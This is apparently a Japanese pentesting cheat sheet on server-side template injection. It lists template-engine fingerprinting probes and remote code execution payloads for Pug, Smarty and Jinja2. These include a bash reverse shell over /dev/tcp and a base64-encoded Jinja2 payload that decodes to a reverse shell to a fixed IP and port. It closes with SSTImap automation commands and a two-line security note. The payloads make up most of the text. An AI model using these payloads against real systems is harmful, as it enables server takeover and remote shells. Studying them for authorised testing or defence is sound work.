# SSTI サーバー側テンプレートインジェクション

## テンプレートの判別

```
# Twig（PHP）
{{7*'7'}} -> 49

# Jinja2（Python）
{{7*'7'}} -> 7777777

# Pug/（旧称 Jade）（Node.js）
#{7*7} -> 49

＃Smarty
{'Hello'|upper} -> HELLO
```

## システムコマンド

### Pug

https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html?highlight=PUG#pugjs-nodejs

javascript コードを直接実行できる

```javascript
#{root.process.mainModule.require('child_process').spawnSync('ls', ['-al']).stdout}

#{global.process.mainModule.require('child_process').spawnSync('ls', ['-al']).stdout}
```

### Smarty

PHP コードを直接実行できる

```PHP
{system("ls")}

{exec("/bin/bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'")}
```

### Jinja2

```Python
# objectクラスのサブクラス一覧
{{"".__class__.__mro__[1].__subclasses__()}}

# <class '_sitebuiltins._Helper'> を使って、
# subprocess.open("ls") を実行
{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(["ls", "-al"])}}

# よりスマートな方法
{{request.application.__globals__.__builtins__.__import__('os').popen('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjE0LjkwLjIzNS80NDQ1IDA+JjE=|base64 -d|bash').read()}}
```

## SSTImap 自動化

### インストール

```shell
git clone https://github.com/vladko312/SSTImap.git
cd SSTImap
pip install -r requirements.txt
```

### 実行

```shell
python3 sstimap.py -X POST -u 'http://$TARGET/' -d 'page='
```

## セキュリティ

- ユーザー入力のサニタイズ
- 環境のサンドボックス化
